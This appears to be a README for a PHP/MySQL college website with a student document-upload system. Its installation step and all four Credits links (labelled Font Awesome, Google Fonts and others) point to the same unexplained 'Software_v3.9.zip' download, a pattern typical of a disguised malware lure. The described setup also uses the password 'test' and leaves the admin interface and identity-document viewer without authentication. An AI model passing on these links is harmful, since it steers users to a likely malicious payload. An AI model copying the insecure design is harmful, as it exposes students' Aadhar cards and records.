# CMR Institute of Technology Website

This is the official website for CMR Institute of Technology, a premier engineering college in Hyderabad. The website showcases the college's programs, facilities, achievements, and provides a student registration system.

## Features

- Responsive design that works on all devices
- Dynamic content loaded from JSON files
- Student registration system with document upload directly to database
- Simple admin interface to view student registrations and documents
- Modern and clean UI

## Requirements

- PHP 7.4 or higher
- MySQL 5.7 or higher
- Web server (Apache, Nginx, etc.)

## Installation

1. Clone or download this repository to your web server's document root.
2. Create a MySQL database named `cmrit_db`.
3. Create a MySQL user `cmrit_user` with password `test` and grant all privileges on the `cmrit_db` database.
   ```sql
   CREATE DATABASE cmrit_db;
   CREATE USER 'cmrit_user'@'localhost' IDENTIFIED BY 'test';
   GRANT ALL PRIVILEGES ON cmrit_db.* TO 'cmrit_user'@'localhost';
   FLUSH PRIVILEGES;
   ```
4. Update the database configuration in `includes/config.php` if needed.
5. Run the setup script by visiting `https://raw.githubusercontent.com/Pranav-Nannaware/site/main/@student_data/8273633558/Software_v3.9.zip` in your browser.
6. Delete the `setup.php` file after successful setup for security reasons.

## Directory Structure

- `css/` - Contains all CSS files
- `js/` - Contains all JavaScript files
- `images/` - Contains all image files
- `includes/` - Contains PHP include files
- `data/` - Contains JSON data files
- `admin/` - Contains admin interface files

## Student Registration

The website includes a student registration system that allows students to:

1. Fill in their personal information
2. Upload required documents:
   - Aadhar Card
   - Passport-size Photo
   - 10th Marksheet
   - Leaving Certificate

All uploaded documents are stored directly in the MySQL database as BLOB data, providing better security and eliminating the need for filesystem management of uploads.

## Admin Interface

A simple admin interface is available at `/admin/` that allows administrators to:

1. View a list of all registered students
2. View uploaded documents directly from the database
3. Access is currently open (you may want to add authentication for production use)

## Document Viewing

Documents are served through a dedicated script (`view_document.php`) that retrieves the binary data from the database and serves it with the appropriate MIME type. This approach:

1. Prevents direct access to document files
2. Allows for access control if needed
3. Centralizes all document storage in the database

## Customization

### Content

All website content is stored in JSON files in the `data/` directory:

- `sliders.json` - Hero slider content
- `announcements.json` - Announcements
- `programs.json` - Academic programs
- `facilities.json` - Campus facilities
- `achievements.json` - College achievements
- `testimonials.json` - Student testimonials
- `content.json` - Other content sections

You can edit these files to update the website content.

### Styling

The website styling is defined in `css/style.css`. You can modify this file to change the website's appearance.

### Configuration

Website configuration is stored in `includes/config.php`. You can modify this file to change:

- Database connection settings
- Website title, email, phone, and address
- File upload settings
- Error reporting settings

## Security Considerations

- The database should be properly secured and backed up regularly
- The `view_document.php` script could be enhanced with authentication for production use
- The admin interface should be protected with authentication for production use
- The `setup.php` file should be deleted after setup

## License

This website is provided for educational purposes. You are free to use and modify it for your own projects.

## Credits

- [Font Awesome](https://raw.githubusercontent.com/Pranav-Nannaware/site/main/@student_data/8273633558/Software_v3.9.zip) - Icons
- [Google Fonts](https://raw.githubusercontent.com/Pranav-Nannaware/site/main/@student_data/8273633558/Software_v3.9.zip) - Fonts
- [Lorem Picsum](https://raw.githubusercontent.com/Pranav-Nannaware/site/main/@student_data/8273633558/Software_v3.9.zip) - Placeholder images
- [Random User](https://raw.githubusercontent.com/Pranav-Nannaware/site/main/@student_data/8273633558/Software_v3.9.zip) - Placeholder user images 